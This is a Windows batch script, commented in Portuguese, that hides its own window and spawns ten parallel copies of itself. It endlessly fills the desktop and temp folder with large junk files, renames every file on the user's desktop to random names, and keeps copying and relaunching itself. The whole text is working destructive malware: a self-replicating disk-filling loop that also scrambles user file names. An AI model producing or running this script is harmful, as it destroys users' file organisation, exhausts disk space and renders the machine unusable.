@echo off
if "%~1"=="hide" goto main
powershell -windowstyle hidden -command "Start-Process cmd -ArgumentList '/c %~nx0 hide' -WindowStyle Hidden"
exit /b

:main
setlocal enabledelayedexpansion

:: INICIAR 10 PROCESSOS EM PARALELO
for /l %%a in (1,1,10) do (
  start /b cmd /c "%~f0" worker
)

if "%~1"=="worker" goto worker

:loop
:: CRIAR PASTAS E ARQUIVOS RAPIDAMENTE NO BATCH PRINCIPAL
mkdir "%userprofile%\desktop\%random%%random%" 2>nul
cd "%userprofile%\desktop\%random%%random%" 2>nul

for /l %%i in (1,1,1000) do (
  fsutil file createnew "%random%.tmp" 1048576 >nul 2>&1
  echo %random% > "%random%.txt" 2>nul
)

:: RENOMEAR TUDO
for /r "%userprofile%\desktop" %%f in (*.*) do (
  ren "%%f" "%random%%random%%random%" 2>nul
)

:: COPIAR O SCRIPT PARA AS PASTAS
copy "%~f0" "%random%%random%.bat" >nul 2>&1

:: ENCHER TEMP
fsutil file createnew "%temp%\%random%%random%.tmp" 10485760 >nul 2>&1
fsutil file createnew "%temp%\%random%%random%.tmp" 10485760 >nul 2>&1
fsutil file createnew "%temp%\%random%%random%.tmp" 10485760 >nul 2>&1

:: MAIS CÓPIAS RODANDO
start /b "" "%~f0" >nul 2>&1
start /b "" "%~f0" >nul 2>&1

goto loop

:worker
:: WORKER QUE CRIA ARQUIVOS SEM PARAR
:workerloop
fsutil file createnew "%temp%\%random%%random%.tmp" 10485760 >nul 2>&1
fsutil file createnew "%userprofile%\desktop\%random%%random%.tmp" 10485760 >nul 2>&1
echo %random%%random% > "%userprofile%\desktop\%random%.txt" 2>nul
goto workerloop
